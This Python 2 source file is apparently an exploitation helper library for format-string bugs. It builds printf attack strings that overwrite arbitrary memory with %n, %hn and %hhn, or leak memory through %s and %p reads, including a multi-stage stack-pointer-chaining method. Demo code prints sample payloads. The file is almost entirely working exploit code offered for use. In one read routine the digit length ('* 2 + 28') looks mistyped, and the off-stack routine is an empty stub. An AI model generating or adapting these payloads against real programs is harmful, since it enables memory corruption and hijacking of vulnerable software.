
from __future__ import print_function
import os
import warnings
from Queue import PriorityQueue

from enum import Enum

try:
    assert os.name == 'posix'
    from pwn import *
except (AssertionError, ImportError):
    def pack(num, length_in_bit):
        num &= ((1 << length_in_bit) - 1)
        byte_list = []
        if num < 0:
            raise ValueError('should be num > 0')
        while num > 0:
            byte_list.append(chr(num % 256))
            num >>= 8
        return ''.join(byte_list).ljust(align(8, length_in_bit) // 8, '\x00')


    def unpack(byte_list, length_in_bit):
        byte_list = byte_list[:length_in_bit // 8]
        figure = 0
        num = 0
        for byte in byte_list:
            num += (ord(byte) << figure)
            figure += 8
        return num & ((1 << length_in_bit) - 1)


    def align(multiple, number):
        num = number + (multiple - 1)
        return num - (num % multiple)


def solve_log_equation(buffer_start, num_of_format_n, total_length_of_other_strings, address_size_in_byte):
    for A in xrange(buffer_start + 2, 0x7fffffff):
        n = (A - buffer_start) * address_size_in_byte - total_length_of_other_strings
        for i in range(num_of_format_n):
            n -= len(str(A + i))
            if n < 0:
                break
        else:
            return A, n

    raise ValueError('No solution in int range!')


class FsbArgumentItem(object):
    """
    memory located at address-boundary and size is address-sized:
        self.order = <int>
        self.offset_start = None
        self.offset_stop = None
    memory not located at address-boundary and size is address-sized:
        self.order = <int>
        self.offset_start = <int> (in [0, address size))
        self.offset_stop = None
    memory not located at address-boundary and size is not address-sized:
        self.order = <int>
        self.offset_start = <int> (in [0, min(address size, offset_stop)))
        self.offset_stop = <int> (in [max(0, offset_start), address size))
    """

    def __init__(self, parent, order, offset_start=None, offset_stop=None):
        """
        :param parent: FsbArgument object in the same context with this.
        """
        self.parent = parent
        self.order = order
        if isinstance(offset_start, (int, long)) and isinstance(offset_stop, (int, long)) \
                and offset_stop < offset_start:
            self.offset_start = offset_stop
            self.offset_stop = offset_start
        else:
            self.offset_start = offset_start
            self.offset_stop = offset_stop

    def __eq__(self, other):
        if not isinstance(other, FsbArgumentItem):
            return False
        return other.parent == self.parent and other.order == self.order \
               and other.offset_start == self.offset_start and other.offset_stop == self.offset_stop

    def __hash__(self):
        return hash((self.order, self.offset_start, self.offset_stop))

    def __str__(self):
        if self.offset_start or self.offset_stop:
            return "printf's argument[{}{}]".format(
                self.order,
                ', {}:{}'.format(self.offset_start if self.offset_start else '',
                                 self.offset_stop if self.offset_stop else '')
            )
        else:
            return "printf's argument[{}]".format(self.order)

    def set_as_pointer_to(self, pointing_at, rebase_stack_using_existing_value=False):
        if not isinstance(pointing_at, FsbArgumentItem):
            raise ValueError('Only argument can be a destination of pointer.')
        if self.offset_start or self.offset_stop:
            raise ValueError('Only argument at position and not sliced can be set as a pointer.')
        try:
            self.parent.arguments[self.order]['pointer_to'] = pointing_at
        except KeyError:
            self.parent.arguments[self.order] = dict(pointer_to=pointing_at, value=None)

        if rebase_stack_using_existing_value:
            if self.parent.arguments[self.order]['value'] is not None:
                pointing_at.address = self.parent.arguments[self.order]['value']
        elif hasattr(self.parent, '_base_address'):
            self.parent.arguments[self.order]['value'] = pointing_at.address

    def pointing_item(self):
        if self.offset_start or self.offset_stop:
            raise ValueError('Only argument at position and not sliced can be a pointer.')
        try:
            item = self.parent.arguments[self.order]['pointer_to']
        except KeyError:
            raise AttributeError('Not a pointer.')

        if item is None:
            raise AttributeError('Not a pointer.')
        return item

    @property
    def address(self):
        return self.parent._base_address + self.order * self.parent.address_size_in_byte \
               + (self.offset_start if self.offset_start else 0)

    @address.setter
    def address(self, address):
        new_base = address - self.order * self.parent.address_size_in_byte \
                   - (self.offset_start if self.offset_start else 0)
        self.parent.update_base_address(new_base)

    @property
    def value(self):
        if not (self.offset_start or self.offset_stop):
            return self.parent.arguments[self.order]['value']
        raise NotImplementedError('Getting sliced value is not implemented.')


class PointerTo(object):
    def __init__(self, arg_item):
        self.arg_item = arg_item


class DataInfo(Enum):
    buffer_start = 1
    current_sfp = 2
    previous_sfp = 3
    two_previous_sfp = 4


class FsbArgument(object):
    def __init__(self, address_size_in_byte):
        self.address_size_in_byte = address_size_in_byte
        self.arguments = dict()  # dict(dict(value=<int>, pointer_to=argument[...] or None))

    def update_base_address(self, new_address):
        if hasattr(self, '_base_address'):
            if self._base_address == new_address:
                return
            else:
                warnings.warn('Argument base address changed.')

        # update pointers
        self._base_address = new_address
        for item in self.arguments.values():
            if item['pointer_to'] is not None:
                item['value'] = item['pointer_to'].address

    def at_address(self, address):
        q, r = divmod(address - self._base_address, self.address_size_in_byte)
        return FsbArgumentItem(self, q, r)

    def __setitem__(self, key, value):
        if value == DataInfo.buffer_start:
            if isinstance(key, tuple):
                if len(key) != 2 or not isinstance(key[0], (int, long)) or not isinstance(key[1], (int, long)):
                    raise KeyError('argument subscript must be [order[,offset]] to set as buffer start.')
                if key[1] < 0:
                    self.buffer_start = key[0] + 1
                    self.buffer_start_offset = self.address_size_in_byte + key[1]
                else:
                    self.buffer_start = key[0]
                    self.buffer_start_offset = key[1]
            else:
                self.buffer_start = key
                self.buffer_start_offset = 0

        elif isinstance(key, (int, long)):
            try:
                self.arguments[key]['value'] = value
                self.arguments[key]['pointer_to'].address = value
            except KeyError:
                self.arguments[key] = dict(value=value, pointer_to=None)
            except AttributeError:  # when ['pointer_to'] is None - do nothing
                pass

        else:
            ValueError('Not supported type: {}'.format(type(value)))

    def __getitem__(self, item):
        if isinstance(item, (int, long)):
            return FsbArgumentItem(self, item, 0, None)
        elif isinstance(item, tuple):
            if isinstance(item[1], (int, long)):
                return FsbArgumentItem(self, item[0], item[1], None)
            elif isinstance(item[1], slice):
                return FsbArgumentItem(self, item[0], item[1].start, item[1].stop)
        raise KeyError('Invalid Key.')


class FSB(object):
    """
    >>> fsb = FSB()
    >>> # prepare payload to overwrite memory from *(0x40100) with data '\x00\x10\x02\x40'.
    >>> fsb.target[0x40100] = '\x00\x10\x02\x40'
    """

    def __init__(self, prefix_length=0, is_x64=False):
        self.number_of_printed = prefix_length
        self.address_size_in_byte = 8 if is_x64 else 4
        self.argument = FsbArgument(self.address_size_in_byte)
        self.target = dict()
        self.leak_targets = []

    def in_stack_payload(self, verbose=False, no_4byte=False, split=False, initial_printf_counter=None):
        """
        in_stack_payload(self, options...) -> attack string (str or tuple).

        requirement:

                self.argument[] = data_info.buffer_start
         is set.
         And one or more
                self.target[self.argument[<order as int>]] = <data as str>
             or
                self.target[<address as int>] = <data as str>
         is set and any other target is not set.

        :param verbose: if True, print detailed information during process.
        :param no_4byte: Use when it takes too long with %n.
         if True, this doesn't use %n to write 4 bytes, instead, split into shorter bytes (e.g. %hn).
        :param split: if True, return tuple(format, padding, addresses). if False, return str.
        :param initial_printf_counter: the number that will be put if you do %n right after the prefix.
            e.g. prefix == 'aaa%8x' --> initial_printf_count = 11 (prefix_length in __init__ = 6)
            default is the same value with prefix_length in __init__ (which is saved as self.number_of_printed)
        :return: attack string (str or tuple).
        """
        prefix_length = self.number_of_printed
        if initial_printf_counter is not None:
            self.number_of_printed = initial_printf_counter
        if not hasattr(self.argument, 'buffer_start'):
            raise AttributeError('Buffer start is unknown.')
        ns = PriorityQueue()
        for addr, data in self.target.iteritems():
            if isinstance(addr, FsbArgumentItem):
                addr = addr.address
            elif not isinstance(addr, (int, long)):
                raise TypeError('Not a writable target type.')
            while data:
                if len(data) >= 4:
                    piece = unpack(data[:4], 32)
                    if piece < 0x08050000 and not no_4byte:
                        ns.put((piece, addr, 'n'))
                    else:
                        half_pieces = [(unpack(data[:2], 16), addr), (unpack(data[2:4], 16), addr + 2)]
                        half_pieces.sort()
                        ns.put(half_pieces[0] + ('hn',))
                        ns.put(half_pieces[1] + ('hn',))
                    data = data[4:]
                    addr += 4
                elif len(data) >= 2:
                    ns.put((unpack(data[:2], 16), addr, 'hn'))
                    data = data[2:]
                    addr += 2
                elif len(data) == 1:
                    ns.put((unpack(data, 8), addr, 'hhn'))
                    break

        format_part = ''
        address_part = []
        length_except_n_index = 0
        not_indexed_n_count = 0

        while not ns.empty():
            data, addr, format_character = ns.get()
            if verbose:
                print('[{:#x}] <- {:#x}'.format(addr, data))

            if self.number_of_printed > data:
                # use integer overflow
                if format_character == 'hn':
                    ns.put((align(0x10000, self.number_of_printed) + data, addr, 'hn'))
                elif format_character == 'hhn':
                    ns.put((align(0x100, self.number_of_printed) + data, addr, 'hhn'))
                else:
                    raise ValueError('Unable to make payload in this case! {:#x} is too small to put.'.format(data))
            elif self.number_of_printed == data:
                format_part += '%{{{0}}}${1}'.format(not_indexed_n_count, format_character)
                length_except_n_index += len('%${0}'.format(format_character))
                not_indexed_n_count += 1
            else:
                difference = data - self.number_of_printed
                format_part += '%{0}c%{{{1}}}${2}'.format(difference if difference > 1 else '', not_indexed_n_count,
                                                          format_character)
                length_except_n_index += len('%{0}c%${1}'.format(data - self.number_of_printed, format_character))
                self.number_of_printed = data
                not_indexed_n_count += 1
            address_part += [pack(addr, self.address_size_in_byte * 8)]

        n_index_start, padding_length = solve_log_equation(self.argument.buffer_start, not_indexed_n_count,
                                                           prefix_length + length_except_n_index + self.argument.buffer_start_offset,
                                                           self.address_size_in_byte)

        format_part = format_part.format(*range(n_index_start, n_index_start + not_indexed_n_count))

        if verbose:
            print('payload: {0}{1}{2}'.format(
                format_part,
                'a' * padding_length,
                ''.join(map(lambda x: ('{{{:#0%dx}}}' % (self.address_size_in_byte * 2 + 2))
                            .format(unpack(x, self.address_size_in_byte * 8)), address_part))
            ))

        if split:
            return format_part, 'a' * padding_length, address_part
        else:
            return format_part + 'a' * padding_length + ''.join(address_part)

    def in_stack_read_payload(self, verbose=False, separator='*#next#*', split=False, argument_leak_size=None,
                              printed_prefix_length=None):
        """
        in_stack_payload(self, bool) -> tuple(attack string (str or tuple), resolver_function).

        requirement:

                self.argument[] = data_info.buffer_start
         is set.
         And one or more
                self.leak_targets += [self.argument[<order as int>]]
             or
                self.leak_targets += [<address as int>]
         is set and any other target is not set.

        :param verbose: if True, print payload formatted to read easily.
        :param separator: string to separate each other if there are several target addresses.
            e.g. result: '<leak1>*#next#*<leak2>*#next#*<leak3>' --> resolved as ['<leak1>', '<leak2>', '<leak3>']
        :param printed_prefix_length: the number of characters that will be printed before this payload.
            e.g. prefix='aaa%8x' --> printed_prefix_length = 11
            default is the same value with prefix_length in __init__ (which is saved as self.number_of_printed)
        :param split: if True, return tuple(format, padding, addresses). if False, return str.
        :param argument_leak_size: size in bytes to leak data in the position of argument. It must be one of:
            1 -> %2hhx
            2 -> %4hx
            4 -> %8x
            8 -> %16llx
         default is address size.( -> %10p/%18p)
         (should be improved to save buffer size?)
        :return: tuple(attack string (str or tuple), resolver_function).
        """
        arg_format_chars = {
            1: '2hhx',
            2: '4hx',
            4: '8x',
            8: '16llx'
        }
        if argument_leak_size is None:
            argument_format_char = '{}p'.format(self.address_size_in_byte * 2 + 2)
        else:
            if argument_leak_size not in arg_format_chars:
                raise ValueError('argument_leak_size must be one of {}.'.format(arg_format_chars.keys()))
            argument_format_char = arg_format_chars[argument_leak_size]

        if printed_prefix_length is None:
            printed_prefix_length = self.number_of_printed
        prefix_length = self.number_of_printed
        if not hasattr(self.argument, 'buffer_start'):
            raise AttributeError('Buffer start is unknown.')

        argument_targets = []
        format_part = ''
        address_targets = []
        for addr in self.leak_targets:
            if isinstance(addr, FsbArgumentItem):
                argument_targets.append(addr)
                format_part += '%{0}${1}'.format(addr.order, argument_format_char)
            elif isinstance(addr, (int, long)):
                address_targets.append(addr)
            else:
                raise TypeError('Not a readable target type.')

        address_part = []
        length_except_s_index = len(format_part)
        not_indexed_s_count = 0

        for i, addr in enumerate(address_targets, 1):
            format_part += '%{{{0}}}$s'.format(not_indexed_s_count)
            length_except_s_index += len('%$s')
            if i != len(address_targets):
                format_part += separator
                length_except_s_index += len(separator)
            not_indexed_s_count += 1
            address_part += [pack(addr, self.address_size_in_byte * 8)]

        n_index_start, padding_length = solve_log_equation(self.argument.buffer_start, not_indexed_s_count,
                                                           prefix_length + length_except_s_index + self.argument.buffer_start_offset,
                                                           self.address_size_in_byte)

        format_part = format_part.format(*range(n_index_start, n_index_start + not_indexed_s_count))

        if verbose:
            print('payload: {0}{1}{2}'.format(
                format_part,
                'a' * padding_length,
                ''.join(map(lambda x: ('{{{:#0%dx}}}' % (self.address_size_in_byte * 2 + 2))
                            .format(unpack(x, self.address_size_in_byte * 8)), address_part))
            ))

        # method's arguments and local variables are captured as resolver's function globals.
        def resolver(output):
            postfix = 'a' * padding_length + ''.join(address_part)
            postfix = postfix.split('\x00', 1)[0]
            if postfix:
                try:
                    postfix_index = output.rindex(postfix)
                except ValueError:
                    warnings.warn('Output seems truncated. printf failed or buffer too small?')
                else:
                    output = output[:postfix_index]
            output = output[printed_prefix_length:]
            result = dict()
            if argument_leak_size is None:
                digit_length = self.address_size_in_byte * 2 + 2
            else:
                digit_length = argument_leak_size * 2
            for target in argument_targets:
                assert isinstance(target, FsbArgumentItem)
                value = int(output[:digit_length], 16)
                if target.offset_stop:
                    value &= ((1 << (target.offset_stop * 8)) - 1)
                if target.offset_start:
                    value >>= (target.offset_start * 8)
                result[target] = value
                output = output[digit_length:]
            for order, target in enumerate(address_targets, 1):
                parts = output.split(separator, 1)
                if len(parts) == 1:
                    if order != len(address_targets):
                        # if some are missing, I'll ignore them.
                        warnings.warn('Values of target addresses ({}) are missing.'
                                      .format(', '.join(map(lambda x: '{:#x}'.format(x), address_targets[i - 1:]))))
                    result[target] = output
                    break
                value, output = parts
                result[target] = value
            return result

        if split:
            return (format_part, 'a' * padding_length, address_part), resolver
        else:
            return format_part + 'a' * padding_length + ''.join(address_part), resolver

    def single_put_payload(self, verbose=False):
        """
        single_put_payload(self, bool) -> attack string.

        Assuming there is no zero byte in the target addresses.
        requirement:
         one or more
            self.target[self.argument[<order as int>]] = <data as str>
         is set and any other target is not set.

        :param verbose: if True, print detailed information during process.
        :return: str. attack string.
        """
        ns = PriorityQueue()
        for destination, data in self.target.iteritems():
            if isinstance(destination, FsbArgumentItem):
                if destination.offset_start:
                    raise KeyError('Sliced argument cannot be used as an address.')
                if len(data) > 4:
                    raise BufferError('Data length must be equal or less than 4, not {:d}'.format(len(data)))
                if len(data) >= 3:
                    if len(data) == 3:
                        warnings.warn(
                            'Your data {} is 3bytes, but 4bytes will be written with a trailing 0 byte.'.format(
                                repr(data)))
                    piece = unpack(data, 32)
                    if piece > 0x08050000:
                        warnings.warn('Your data converted to int is too big. It will take long time to trigger FSB '
                                      'or make unintended result')

                    ns.put((piece, destination, 'n'))
                elif len(data) >= 2:
                    ns.put((unpack(data[:2], 16), destination, 'hn'))
                else:
                    assert len(data) == 1
                    ns.put((unpack(data, 8), destination, 'hhn'))
            else:
                raise TypeError(destination)

        format_part = ''
        while not ns.empty():
            data, destination, format_character = ns.get()
            if verbose:
                print('[{}] <- {:#x}'.format(destination, data))
            if self.number_of_printed > data:
                # use integer overflow
                if format_character == 'hn':
                    ns.put((align(0x10000, self.number_of_printed) + data, destination, 'hn'))
                elif format_character == 'hhn':
                    ns.put((align(0x100, self.number_of_printed) + data, destination, 'hhn'))
                else:
                    raise ValueError('Unable to make payload in this case! {:#x} is too small to put.'.format(data))
            elif self.number_of_printed == data:
                format_part += '%{0}${1}'.format(destination.order, format_character)
            else:
                difference = data - self.number_of_printed
                format_part += '%{0}c%{1}${2}'.format(difference if difference > 1 else '', destination.order,
                                                      format_character)
                self.number_of_printed += difference

        return format_part

    def single_read_payload(self, verbose=False, argument_leak_size=None, printed_prefix_length=None):
        """
        in_stack_payload(self, bool) -> tuple(attack string, resolver function).

        requirement:
         And one or more
                self.leak_targets += [self.argument[<order as int>]]
         is set and any other target is not set.

        :param verbose: if True, print payload formatted to read easily.
        :param printed_prefix_length: the number of characters that will be printed before this payload.
            e.g. prefix='aaa%8x' --> printed_prefix_length = 11
            default is the same value with prefix_length in __init__ (which is saved as self.number_of_printed)
        :param argument_leak_size: size in bytes to leak data in the position of argument. It must be one of:
            1 -> %2hhx
            2 -> %4hx
            4 -> %8x
            8 -> %16llx
         default is address size.( -> %10p/%18p)
         (should be improved to save buffer size?)
        :return: tuple(attack string, resolver_function).
        """
        arg_format_chars = {
            1: '2hhx',
            2: '4hx',
            4: '8x',
            8: '16llx'
        }
        if argument_leak_size is None:
            argument_format_char = '{}p'.format(self.address_size_in_byte * 2 + 2)
        else:
            if argument_leak_size not in arg_format_chars:
                raise ValueError('argument_leak_size must be one of {}.'.format(arg_format_chars.keys()))
            argument_format_char = arg_format_chars[argument_leak_size]

        if printed_prefix_length is None:
            printed_prefix_length = self.number_of_printed

        argument_targets = []
        format_part = ''
        for addr in self.leak_targets:
            if isinstance(addr, FsbArgumentItem):
                argument_targets.append(addr)
                format_part += '%{0}${1}'.format(addr.order, argument_format_char)
            else:
                raise TypeError('Not a readable target type.')

        if verbose:
            print('payload: {0}'.format(format_part))

        # method's arguments and local variables are captured as resolver's function globals.
        def resolver(output):
            output = output[printed_prefix_length:]
            result = dict()
            if argument_leak_size is None:
                digit_length = self.address_size_in_byte * 2 + 28
            else:
                digit_length = argument_leak_size * 2
            for target in argument_targets:
                assert isinstance(target, FsbArgumentItem)
                value = int(output[:digit_length], 16)
                if target.offset_stop:
                    value &= ((1 << (target.offset_stop * 8)) - 1)
                if target.offset_start:
                    value >>= (target.offset_start * 8)
                result[target] = value
                output = output[digit_length:]
            return result

        return format_part, resolver

    def double_stack_pointer_payload(self, starting_pointer, verbose=False, least_stage=False, restore_ptrptr_to=None,
                                     restore_ptr_to=None, restore_ptr_dest_to=None):
        """
        double_stack_pointer_payload(self, bool) -> list of attack string.

          This payload assumes two or more stack-pointing SFPs are in the stack.
         i.e. the printf function is called in 2 or more stack frames above main().
          And this assumes you can call vulnerable printf in the same position several times, and also,
         the address-sized memory in the place of third SFP is not changed over each time of call.

        requirement:
         Set two pointers like chained to point an argument. For example:
                self.argument[<order1 as int>].set_as_pointer_to(self.argument[<order2 as int>])
                self.argument[<order2 as int>].set_as_pointer_to(self.argument[<order3 as int>])

         And stack address should be known. You must at least once do something like:
                self.argument[<order as int>].address = <address as int>
            or
                self.argument[<order of pointer to other argument>] = <address value in that pointer>

         And one or more
                self.target[self.argument[<order as int>]] = <data as str>
            or
                self.target[<address as int>] = <data as str>
         is set and any target in other than these format is not set.

        :param least_stage:
        :param starting_pointer: instance of FsbArgumentItem. A pointer of pointer of stack
        :param verbose: if True, print detailed information during process.
        :param restore_ptrptr_to: int.
        :param restore_ptr_to: int.
        :param restore_ptr_dest_to: int.
         if set, add payload to restore value of each pointer to corresponding value which may be spoiled during
         process.
        :return: list of attack string in order, to use each time of call printf().
        """
        # in A -> B -> C...
        ptr_ptr = starting_pointer  # A
        ptr = starting_pointer.pointing_item()  # B
        ptr_dest = ptr.pointing_item()  # C

        if not hasattr(self.argument, '_base_address'):
            raise AttributeError('Stack address is not known.')

        ns = PriorityQueue()
        for addr, data in self.target.iteritems():
            while data:
                if len(data) >= 4:
                    piece = unpack(data[:4], 32)
                    if piece < 0x08050000:
                        ns.put((piece, addr, 'n'))
                    else:
                        half_pieces = [(unpack(data[:2], 16), addr), (unpack(data[2:4], 16), addr + 2)]
                        half_pieces.sort()
                        ns.put(half_pieces[0] + ('hn',))
                        ns.put(half_pieces[1] + ('hn',))
                    data = data[4:]
                    addr += 4
                elif len(data) >= 2:
                    ns.put((unpack(data[:2], 16), addr, 'hn'))
                    data = data[2:]
                    addr += 2
                elif len(data) == 1:
                    ns.put((unpack(data, 8), addr, 'hhn'))
                    break

        stages = []
        first_loop = True
        least_stage_payload = ''
        prefix_length = self.number_of_printed
        while not ns.empty():
            data, addr, format_character = ns.get()
            for i in range(0, self.address_size_in_byte, 2):
                if first_loop:
                    first_loop = False
                    if ptr_dest.offset_start:
                        new_dest = None
                        while True:
                            c = (self.argument._base_address - self.number_of_printed) % self.address_size_in_byte
                            new_dest = (ptr_dest.address & ~0xff) | ((self.number_of_printed + c) & 0xff)
                            if new_dest == ptr_ptr.address or new_dest == ptr.address:
                                c += self.address_size_in_byte
                            else:
                                break
                        if c > 0:
                            aligner = '%{0}c%{1}$hhn'.format(c if c > 1 else '', ptr_ptr.order)
                        else:
                            aligner = '%{0}$hhn'.format(ptr_ptr.order)

                        if least_stage:
                            least_stage_payload += aligner
                        else:
                            stages += [aligner]
                        ptr_dest = self.argument.at_address(new_dest)
                        ptr.set_as_pointer_to(ptr_dest)
                        if verbose:
                            print('(align) [{}]==[{}] <- &{} ({:#x})'.format(ptr_ptr, ptr.order, ptr_dest, new_dest))
                else:
                    if verbose:
                        print('[{}]==[{}] <- {:x}'.format(ptr_ptr, ptr.order,
                                                          (ptr_dest.address + i) & 0xffff))
                    putter = FSB(prefix_length=self.number_of_printed, is_x64=(self.address_size_in_byte == 8))
                    putter.target[putter.argument[ptr_ptr.order]] = pack((ptr_dest.address + i) & 0xffff, 16)
                    payload = putter.single_put_payload()
                    if least_stage:
                        least_stage_payload += payload
                        self.number_of_printed = putter.number_of_printed
                        # if verbose:
                        #     print 'printed: {:x}'.format(self.number_of_printed)
                    else:
                        stages += [putter.single_put_payload()]
                if verbose:
                    print('[{} ({:#x})]==[{}] <- {:04x}'.format(
                        ptr,
                        ptr.value & ~0xffff | (ptr_dest.address + i) & 0xffff,
                        ptr_dest.order,
                        (addr >> (8 * i)) & 0xffff)
                    )
                    pointer_str_list = ['0000'] * (self.address_size_in_byte // 2)
                    pointer_str_list[i // 2] = '[{:04x}]'.format((addr >> (8 * i)) & 0xffff)
                    print(' [{}]: 0x{}'.format(ptr_dest.order, ''.join(reversed(pointer_str_list))))

                if least_stage:
                    putter = FSB(prefix_length=self.number_of_printed, is_x64=(self.address_size_in_byte == 8))
                    putter.target[putter.argument[ptr.order]] = pack((addr >> (8 * i)) & 0xffff, 16)
                    least_stage_payload += putter.single_put_payload()
                    self.number_of_printed = putter.number_of_printed
                    # if verbose:
                    #     print 'printed: {:x}'.format(self.number_of_printed)
                else:
                    putter = FSB(prefix_length=self.number_of_printed, is_x64=(self.address_size_in_byte == 8))
                    putter.target[putter.argument[ptr.order]] = pack((addr >> (8 * i)) & 0xffff, 16)
                    stages += [putter.single_put_payload()]

            if verbose:
                print('[{0}] <- {1:x}'.format(ptr_dest, data))
                print()

            if least_stage:
                if format_character == 'hhn':
                    if (self.number_of_printed & 0xff) <= data:
                        c = data - self.number_of_printed & 0xff
                    else:
                        c = align(0x100, self.number_of_printed) + data - self.number_of_printed
                elif format_character == 'hn':
                    if (self.number_of_printed & 0xffff) <= data:
                        c = data - self.number_of_printed & 0xffff
                    else:
                        c = align(0x10000, self.number_of_printed) + data - self.number_of_printed
                else:
                    assert format_character == 'n'
                    if self.number_of_printed <= data:
                        c = data - self.number_of_printed
                    else:
                        stages += [least_stage_payload]
                        c = data
                        least_stage_payload = ''

                if c > 0:
                    least_stage_payload += '%{0}c%{1}${2}'.format(c if c > 1 else '', ptr_dest.order, format_character)
                else:
                    least_stage_payload += '%{0}${1}'.format(ptr_dest.order, format_character)
                self.number_of_printed += c
                # if verbose:
                #     print 'printed: {:x}'.format(self.number_of_printed)
            else:
                if data > 0:
                    data_put_payload = '%{0}c'.format(data if data > 1 else '')
                else:
                    data_put_payload = ''
                data_put_payload += '%{0}${1}'.format(ptr_dest.order, format_character)

                stages += [data_put_payload]
        if least_stage:
            return stages + [least_stage_payload]
        else:
            return stages

    def off_stack_payload(self, verbose=False):
        pass


def fill_null_bytes(payload, is_zero_filled_buffer=True):
    """
    payload -> string generator
    help write string which includes null bytes into the remote buffer who recognizes null as a terminator.
    assumes that when a string is sent, string + '\x00' is written to the buffer
    :param payload: payload string that contains null bytes.
    :param is_zero_filled_buffer: is the buffer that payload is written a zero-filled buffer initially?
    :return: generates string to write each step to make payload as a result. (padded with several 'p's)
    """
    assert isinstance(payload, str)
    head = payload
    if is_zero_filled_buffer:
        head = head.rstrip('\x00')
    while head:
        parts = head.rsplit('\x00', 1)
        if len(parts) == 1:
            yield head
            break
        head, tail = parts
        yield 'p' * (len(head) + 1) + tail


if __name__ == '__main__':
    # test codes
    print('1. Single put')
    f = FSB(prefix_length=0)
    f.target[f.argument[10]] = pack(0xabcd, 16)
    print(repr(f.single_put_payload(verbose=True)))
    print()

    print('2. In-stack Format String Attack')
    f = FSB(prefix_length=0, is_x64=True)
    f.argument[4] = DataInfo.buffer_start
    f.target[0x00007ffdf499df8a] = pack(0x00007ffdf499df8e, 64)
    print(repr(f.in_stack_payload(verbose=True, split=False)))
    print()

    print('3. Double-stack-pointer-based Format String Attack')
    f = FSB(prefix_length=0, is_x64=True)
    f.argument[6].set_as_pointer_to(f.argument[11])
    f.argument[11].set_as_pointer_to(f.argument[17])
    f.argument[11] = 0xbfff1000
    f.target[0x00007ffdf499df8a] = 'deadbeaf'.decode('hex')
    print(f.double_stack_pointer_payload(starting_pointer=f.argument[6], verbose=True))
    print()
    # TODO: add feature to use target value 'any_value(length)' and one can find the value in FSB[address] or FSB[FSB.argument[order]] or FSB.filled_values as str.

    print('4. In-stack leak')
    f = FSB()
    f.argument[4] = DataInfo.buffer_start
    f.leak_targets += [0x08040101, 0xffffb8f7, f.argument[20, 1:3]]
    payload_str, resolve = f.in_stack_read_payload(verbose=True)
    print(repr(payload_str))
    print('example resolution:')
    example_output = '0xaabbccdd\x01\x7e\xff\xbf*#next#*adfaaa\x01\x01\x04\x08\xf7\xb8\xff\xff'
    for place, val in resolve(example_output).iteritems():
        if isinstance(place, FsbArgumentItem):
            print('\t{}: {:#x}'.format(place, val))
        else:
            print('\t{:#x}: {}'.format(place, repr(val)))
    print()

    print('5. General off-stack Format String Attack <- TODO ... may be never do..')
    f = FSB()
    f.argument[0].set_as_pointer_to(f.argument[10])
    target_address = 0x00007ffdf499df8a
    f.argument[10, 8:4] = (target_address >> 16)
    f.target[0x00000000004010DF] = target_address
    print(repr(f.off_stack_payload(verbose=True)))
    print()
